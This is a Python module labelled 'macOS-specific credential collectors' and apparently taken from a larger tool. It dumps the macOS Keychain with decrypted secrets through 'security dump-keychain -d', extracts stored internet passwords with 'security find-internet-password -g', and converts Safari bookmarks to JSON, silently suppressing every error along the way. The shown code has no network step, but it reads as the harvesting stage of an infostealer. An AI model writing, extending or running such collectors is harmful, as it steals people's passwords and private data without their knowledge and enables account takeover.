"""
macOS-specific credential collectors.
"""
import subprocess
from pathlib import Path
from typing import Dict, List, Any
from ..utils import get_home_dir, safe_read_file


def collect_keychain_data() -> List[Dict[str, Any]]:
    """
    Collect macOS Keychain information using security command.
    
    Returns:
        List of keychain data
    """
    keychain_data = []
    
    try:
        # Dump keychain items (generic passwords)
        result = subprocess.run(
            ['security', 'dump-keychain', '-d'],
            capture_output=True,
            text=True,
            timeout=10
        )
        
        if result.returncode == 0 or result.stderr:
            # Output often goes to stderr for security dump
            keychain_data.append({
                'type': 'macos_keychain_dump',
                'content': result.stderr or result.stdout
            })
    except Exception:
        pass
    
    # Try to get internet passwords
    try:
        result = subprocess.run(
            ['security', 'find-internet-password', '-g', '-a', ''],
            capture_output=True,
            text=True,
            timeout=5
        )
        
        if result.stderr:
            keychain_data.append({
                'type': 'macos_internet_passwords',
                'content': result.stderr
            })
    except Exception:
        pass
    
    return keychain_data


def collect_safari_data() -> List[Dict[str, Any]]:
    """
    Collect Safari browser data.
    
    Returns:
        List of Safari data
    """
    safari_data = []
    
    safari_dir = get_home_dir() / 'Library' / 'Safari'
    if not safari_dir.exists():
        return safari_data
    
    # Bookmarks
    bookmarks = safari_dir / 'Bookmarks.plist'
    if bookmarks.exists():
        try:
            result = subprocess.run(
                ['plutil', '-convert', 'json', '-o', '-', str(bookmarks)],
                capture_output=True,
                text=True,
                timeout=5
            )
            
            if result.returncode == 0:
                safari_data.append({
                    'type': 'safari_bookmarks',
                    'content': result.stdout
                })
        except Exception:
            pass
    
    return safari_data


def collect_macos_data() -> Dict[str, Any]:
    """
    Collect all macOS-specific environment data.
    
    Returns:
        Dictionary containing all collected macOS data
    """
    data = {
        'keychain': collect_keychain_data(),
        'safari': collect_safari_data()
    }
    
    return data
